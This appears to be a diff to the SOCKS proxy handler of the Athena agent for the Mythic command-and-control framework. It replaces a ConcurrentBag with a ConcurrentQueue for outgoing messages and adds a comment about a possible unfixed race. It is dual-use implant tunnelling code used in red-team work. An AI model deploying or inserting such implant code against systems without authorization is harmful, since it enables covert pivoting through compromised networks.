@@ -16,7 +16,7 @@ namespace Athena.Commands.Model
     {
         private CancellationTokenSource ct { get; set; }
         private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
-        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
+        private ConcurrentQueue<SocksMessage> messagesOut = new ConcurrentQueue<SocksMessage>();
         private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
         public bool running { get; set; }
         public SocksHandler()
@@ -58,8 +58,9 @@ namespace Athena.Commands.Model
 
         public List<SocksMessage> getMessages()
         {
+            //Is it possible to receive messages in between the time I call ToList() and when I call Clear()?
+            //I should probably add locking to prevent it if true.
             List<SocksMessage> messages = this.messagesOut.ToList();
-            //Misc.WriteDebug("Messages Out Queue: " + messagesOut.Count);
             this.messagesOut.Clear();
             messages.Reverse();
             return messages;
@@ -67,7 +68,6 @@ namespace Athena.Commands.Model
 
         public void AddToQueue(SocksMessage message)
         {
-            //Misc.WriteDebug("Message In Queue: " + messagesIn.Count);
             this.messagesIn.Enqueue(message);
         }
 
@@ -114,7 +114,7 @@ namespace Athena.Commands.Model
                             };
 
                             //Add to our messages queue.
-                            this.messagesOut.Add(smOut);
+                            this.messagesOut.Enqueue(smOut);
                         }
                     }
                     catch (ObjectDisposedException)
@@ -196,7 +196,7 @@ namespace Athena.Commands.Model
                     };
 
                     //Add to our messages queue.
-                    this.messagesOut.Add(smOut);
+                    this.messagesOut.Enqueue(smOut);
 
                     //Remove connection from our tracker.
                     //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
@@ -237,7 +237,7 @@ namespace Athena.Commands.Model
 
                         //Send Response
                         //Globals.bagOut[sm.server_id] = smOut;
-                        this.messagesOut.Add(smOut);
+                        this.messagesOut.Enqueue(smOut);
                         //Return an unsupported error
                     }
                     else
@@ -288,7 +288,7 @@ namespace Athena.Commands.Model
                                     exit = false
                                 };
                                 //Add to our message queue
-                                this.messagesOut.Add(smOut);
+                                this.messagesOut.Enqueue(smOut);
 
                                 //Add the ConnectionsOptions object to our tracker.
                                 //Mostly only down here to prevent us from having to worry about removing it if something happened with adding it to the MythicOut queue
@@ -351,7 +351,7 @@ namespace Athena.Commands.Model
                                     exit = true
                                 };
                                 //Put in out queue
-                                this.messagesOut.Add(smOut);
+                                this.messagesOut.Enqueue(smOut);
                             }
                         }
                         //It did not.
@@ -395,7 +395,7 @@ namespace Athena.Commands.Model
                             };
 
                             //Add it to queue, and we're outta here!
-                            this.messagesOut.Add(smOut);
+                            this.messagesOut.Enqueue(smOut);
                         }
                     }
                 }
@@ -436,7 +436,7 @@ namespace Athena.Commands.Model
                     data = Misc.Base64Encode(bytes),
                     exit = false
                 };
-                this.messagesOut.Add(smOut);
+                this.messagesOut.Enqueue(smOut);
             }
 
             //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
@@ -447,7 +447,7 @@ namespace Athena.Commands.Model
                 data = Misc.Base64Encode(new byte[] { }),
                 exit = true
             };
-            this.messagesOut.Add(smOut);
+            this.messagesOut.Enqueue(smOut);
         }
        
     }
